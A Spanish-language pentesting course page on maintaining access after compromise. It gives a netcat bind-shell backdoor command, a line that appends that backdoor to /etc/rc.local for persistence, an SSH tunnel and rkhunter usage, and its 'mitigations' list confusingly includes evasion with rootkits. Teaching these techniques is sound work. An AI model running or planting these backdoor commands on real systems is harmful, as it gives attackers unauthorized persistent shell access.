<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Mantenimiento del Acceso</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css?v=4" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725" crossorigin="anonymous"></script>  	
	</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-6 p-2 p-md-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-6 p-2 p-md-0 text-end">
			<span>	<a href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">EN</a></b>
	|
	<b class="px-2">ES</b>
	|
	<a href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">CA</a>
</span>
			<span class="d-none d-md-inline"><br><cite>Todo el conocimiento a tu alcance</cite></span>
		</div>
	</div>
</div>
<div class="subheader container-xxl d-none d-md-block">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective">El Proyecto</a> | 
<a href="/about">Sobre nosotros</a> | 
<a href="/contribute">Contribuir</a> | 
<a href="/donate">Donaciones</a> | 
<a href="/licence">Licencia</a>
		</div>
	</div>
</div>

<div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
					 				<a href="/"><i class="bi bi-house-fill"></i> HOME</a>
											</div>
		</div>
	</div>
</div>
		
<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
				<div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegios">
				<span class="d-none d-md-inline">&#x25C4; Anterior</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Mantenimiento del Acceso</h2></a>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Huellas">
				<span class="d-none d-md-inline">Siguiente &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>
<div class='content'></div><h1>Introducción</h1>
<div class='content'><p>El mantenimiento del acceso es una fase crucial en el proceso de post-explotación durante una prueba de penetración. Una vez que un pentester ha logrado comprometer un sistema, es esencial asegurar que el acceso se pueda mantener para realizar análisis adicionales, recopilar más información o preparar el terreno para futuras acciones. Este módulo cubrirá las técnicas y herramientas utilizadas para mantener el acceso a un sistema comprometido.</p>
</div><h1>Objetivos de Aprendizaje</h1>
<div class='content'><p>Al finalizar este módulo, los estudiantes serán capaces de:</p>
<ol>
<li>Comprender la importancia del mantenimiento del acceso en el pentesting.</li>
<li>Identificar y utilizar diversas técnicas para mantener el acceso a sistemas comprometidos.</li>
<li>Implementar herramientas y scripts para automatizar el mantenimiento del acceso.</li>
<li>Reconocer y mitigar los riesgos asociados con el mantenimiento del acceso.</li>
</ol>
</div><h1>Conceptos Clave</h1>
<div class='content'></div><h2><ol>
<li>Backdoors</li>
</ol></h2>
<div class='content'><p>Una backdoor es un método para eludir la autenticación normal y obtener acceso remoto a un sistema comprometido. Las backdoors pueden ser instaladas manualmente o mediante scripts automatizados.</p>
</div><h2><ol start="2">
<li>Rootkits</li>
</ol></h2>
<div class='content'><p>Los rootkits son conjuntos de herramientas diseñadas para ocultar la presencia de ciertos procesos o programas en el sistema, permitiendo al atacante mantener el acceso sin ser detectado.</p>
</div><h2><ol start="3">
<li>Túneles y Proxies</li>
</ol></h2>
<div class='content'><p>Los túneles y proxies permiten a los atacantes redirigir el tráfico de red a través de sistemas comprometidos, facilitando el acceso remoto y la comunicación segura.</p>
</div><h2><ol start="4">
<li>Persistencia</li>
</ol></h2>
<div class='content'><p>La persistencia se refiere a las técnicas utilizadas para asegurar que el acceso se mantenga incluso después de reinicios del sistema o intentos de limpieza por parte de los administradores.</p>
</div><h1>Técnicas de Mantenimiento del Acceso</h1>
<div class='content'></div><h2><ol>
<li>Instalación de Backdoors</li>
</ol></h2>
<div class='content'><h4>Ejemplo de Backdoor con Netcat</h4>
<p>Netcat es una herramienta versátil que puede ser utilizada para crear backdoors simples.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFbiBlbCBzaXN0ZW1hIGNvbXByb21ldGlkbwpuYyAtbHZwIDQ0NDQgLWUgL2Jpbi9iYXNo"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># En el sistema comprometido
nc -lvp 4444 -e /bin/bash</pre></div><div class='content'><h4>Explicación:</h4>
<ul>
<li><code>nc</code>: Comando para ejecutar Netcat.</li>
<li><code>-lvp 4444</code>: Escucha en el puerto 4444.</li>
<li><code>-e /bin/bash</code>: Ejecuta una shell bash cuando se establece una conexión.</li>
</ul>
<h4>Ejercicio:</h4>
<ol>
<li>Instala Netcat en un sistema de prueba.</li>
<li>Configura una backdoor utilizando el comando anterior.</li>
<li>Conéctate a la backdoor desde otro sistema utilizando:
<pre><code class="language-bash">nc &lt;IP_del_sistema_comprometido&gt; 4444
</code></pre>
</li>
</ol>
</div><h2><ol start="2">
<li>Uso de Rootkits</li>
</ol></h2>
<div class='content'><h4>Ejemplo de Rootkit: <code>rkHunter</code></h4>
<p><code>rkHunter</code> es una herramienta que puede ser utilizada para detectar rootkits, pero también se puede estudiar para entender cómo funcionan.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBJbnN0YWxhY2nDs24gZGUgcmtIdW50ZXIKc3VkbyBhcHQtZ2V0IGluc3RhbGwgcmtodW50ZXIKCiMgRWplY3VjacOzbiBkZSBya0h1bnRlcgpzdWRvIHJraHVudGVyIC0tY2hlY2s="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Instalaci&oacute;n de rkHunter
sudo apt-get install rkhunter

# Ejecuci&oacute;n de rkHunter
sudo rkhunter --check</pre></div><div class='content'><h4>Explicación:</h4>
<ul>
<li><code>rkhunter --check</code>: Escanea el sistema en busca de rootkits conocidos.</li>
</ul>
<h4>Ejercicio:</h4>
<ol>
<li>Instala <code>rkHunter</code> en un sistema de prueba.</li>
<li>Ejecuta un escaneo y analiza los resultados.</li>
</ol>
</div><h2><ol start="3">
<li>Configuración de Túneles y Proxies</li>
</ol></h2>
<div class='content'><h4>Ejemplo de Túnel SSH</h4>
<p>Un túnel SSH puede ser utilizado para redirigir el tráfico a través de un sistema comprometido.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFbiBlbCBzaXN0ZW1hIGF0YWNhbnRlCnNzaCAtTCA4MDgwOmxvY2FsaG9zdDo4MCB1c2VyQDxJUF9kZWxfc2lzdGVtYV9jb21wcm9tZXRpZG8+"))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># En el sistema atacante
ssh -L 8080:localhost:80 user@&lt;IP_del_sistema_comprometido&gt;</pre></div><div class='content'><h4>Explicación:</h4>
<ul>
<li><code>-L 8080:localhost:80</code>: Redirige el puerto 8080 del sistema atacante al puerto 80 del sistema comprometido.</li>
</ul>
<h4>Ejercicio:</h4>
<ol>
<li>Configura un túnel SSH utilizando el comando anterior.</li>
<li>Accede a un servicio web en el sistema comprometido a través del túnel.</li>
</ol>
</div><h2><ol start="4">
<li>Implementación de Persistencia</li>
</ol></h2>
<div class='content'><h4>Ejemplo de Script de Persistencia</h4>
<p>Un script de persistencia puede ser añadido a los scripts de inicio del sistema para asegurar que una backdoor se ejecute después de cada reinicio.</p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBTY3JpcHQgZGUgcGVyc2lzdGVuY2lhIGVuIC9ldGMvcmMubG9jYWwKZWNobyAibmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaCIgPj4gL2V0Yy9yYy5sb2NhbA=="))));alert("¡Copiado!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Script de persistencia en /etc/rc.local
echo &quot;nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/rc.local</pre></div><div class='content'><h4>Explicación:</h4>
<ul>
<li><code>echo &quot;nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/rc.local</code>: Añade el comando de Netcat al script de inicio del sistema.</li>
</ul>
<h4>Ejercicio:</h4>
<ol>
<li>Añade un comando de backdoor al script de inicio del sistema.</li>
<li>Reinicia el sistema y verifica que la backdoor se ejecute automáticamente.</li>
</ol>
</div><h1>Riesgos y Mitigaciones</h1>
<div class='content'></div><h2>Riesgos</h2>
<div class='content'><ul>
<li><strong>Detección por Administradores</strong>: Las técnicas de mantenimiento del acceso pueden ser detectadas por administradores de sistemas.</li>
<li><strong>Compromiso de Seguridad</strong>: Mantener el acceso puede comprometer la seguridad del sistema y exponerlo a otros atacantes.</li>
</ul>
</div><h2>Mitigaciones</h2>
<div class='content'><ul>
<li><strong>Uso de Técnicas de Evasión</strong>: Utilizar técnicas avanzadas para evadir la detección, como rootkits y cifrado de tráfico.</li>
<li><strong>Monitoreo y Auditoría</strong>: Implementar monitoreo y auditoría continua para detectar y mitigar accesos no autorizados.</li>
</ul>
</div><h1>Conclusión</h1>
<div class='content'><p>El mantenimiento del acceso es una fase crítica en el pentesting que permite a los atacantes asegurar su presencia en un sistema comprometido. A través de técnicas como la instalación de backdoors, el uso de rootkits, la configuración de túneles y proxies, y la implementación de scripts de persistencia, los pentesters pueden mantener el acceso y continuar con sus actividades de evaluación de seguridad. Sin embargo, es esencial ser consciente de los riesgos asociados y tomar medidas para mitigarlos.</p>
</div><h2>Resumen</h2>
<div class='content'><ul>
<li><strong>Backdoors</strong>: Métodos para obtener acceso remoto.</li>
<li><strong>Rootkits</strong>: Herramientas para ocultar la presencia de procesos.</li>
<li><strong>Túneles y Proxies</strong>: Redirigir tráfico de red.</li>
<li><strong>Persistencia</strong>: Asegurar el acceso después de reinicios.</li>
</ul>
</div><h2>Próximos Pasos</h2>
<div class='content'><p>En el siguiente módulo, exploraremos la <strong>Cobertura de Huellas</strong>, donde aprenderemos cómo ocultar las actividades realizadas durante una prueba de penetración para evitar la detección.</p>
</div><div class='row navigation'>
	<div class='col-1 col-md-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegios">
				<span class="d-none d-md-inline">&#x25C4; Anterior</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-left-square-fill"></i></span>
			</a>
			</div>
	<div class='col-10 col-md-8 text-center'>
			</div>
	<div class='col-1 col-md-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Huellas">
				<span class="d-none d-md-inline">Siguiente &#x25BA;</span>
				<span class="d-inline d-md-none"><i class="bi bi-caret-right-square-fill"></i></span>
			</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<!-- 
<h1>Publicidad</h1>
<p>Este espacio está destinado a publicidad.</p>
<p>Si quieres ser patrocinador, contáctanos para incluir enlaces en esta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
<p>¡Gracias por colaborar!</p>
-->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725"
     crossorigin="anonymous"></script>
<!-- enterprise_campus -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-0611338592562725"
     data-ad-slot="6914733106"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
			









		</div>
	</div>
</div>

<div class="container-xxl d-block d-md-none">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objective">El Proyecto</a> | 
<a href="/about">Sobre nosotros</a> | 
<a href="/contribute">Contribuir</a> | 
<a href="/donate">Donaciones</a> | 
<a href="/licence">Licencia</a>
		</div>
	</div>
</div>

<div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Todos los derechos reservados</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Usamos cookies para mejorar tu experiencia de uso y ofrecer contenidos adaptados a tus intereses.
    <a href="#" id="btn_accept_cookies" class="button">Aceptar</a>
    <a href="/cookies">Mas información</a>
</div>	

	</div>    
</body>
</html>
